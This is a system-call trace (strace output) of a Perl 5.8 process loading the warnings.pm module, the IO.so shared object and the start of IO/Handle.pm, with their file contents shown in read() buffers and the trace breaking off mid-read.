12518 20:27:41.773574 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773587 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773602 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773615 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773633 stat64("/usr/lib/perl5/warnings.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773645 stat64("/usr/lib/perl5/warnings.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773668 stat64("/usr/share/perl5/warnings.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773681 stat64("/usr/share/perl5/warnings.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773695 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773708 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773722 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.773735 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
12518 20:27:41.773756 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
12518 20:27:41.773771 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2afe8) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.773782 _llseek(8, 0, [0], SEEK_CUR) = 0
12518 20:27:41.773801 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
12518 20:27:41.774180 brk(0x81b6000)    = 0x81b6000
12518 20:27:41.774198 brk(0x81b5000)    = 0x81b5000
12518 20:27:41.774279 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
12518 20:27:41.774709 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
12518 20:27:41.775503 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
12518 20:27:41.775640 read(8, "", 4096) = 0
12518 20:27:41.775654 close(8)          = 0
12518 20:27:41.775819 _llseek(6, 412, [412], SEEK_SET) = 0
12518 20:27:41.775836 _llseek(6, 0, [412], SEEK_CUR) = 0
12518 20:27:41.775847 close(6)          = 0
12518 20:27:41.775889 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
12518 20:27:41.775914 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
12518 20:27:41.775942 futex(0xb7f99070, 0x81 /* FUTEX_??? */, 2147483647) = 0
12518 20:27:41.775957 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
12518 20:27:41.775972 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12518 20:27:41.776062 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
12518 20:27:41.776088 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7f9d000
12518 20:27:41.776101 mmap2(0xb7fa1000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7fa1000
12518 20:27:41.776116 close(6)          = 0
12518 20:27:41.776282 stat64("/etc/perl/IO/Handle.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.776316 stat64("/etc/perl/IO/Handle.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.776330 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.776343 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.776358 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.776371 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.776385 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.776397 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.776411 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.776423 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.776437 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.776450 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
12518 20:27:41.776471 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
12518 20:27:41.776490 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2b498) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.776502 _llseek(6, 0, [0], SEEK_CUR) = 0
12518 20:27:41.776519 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, 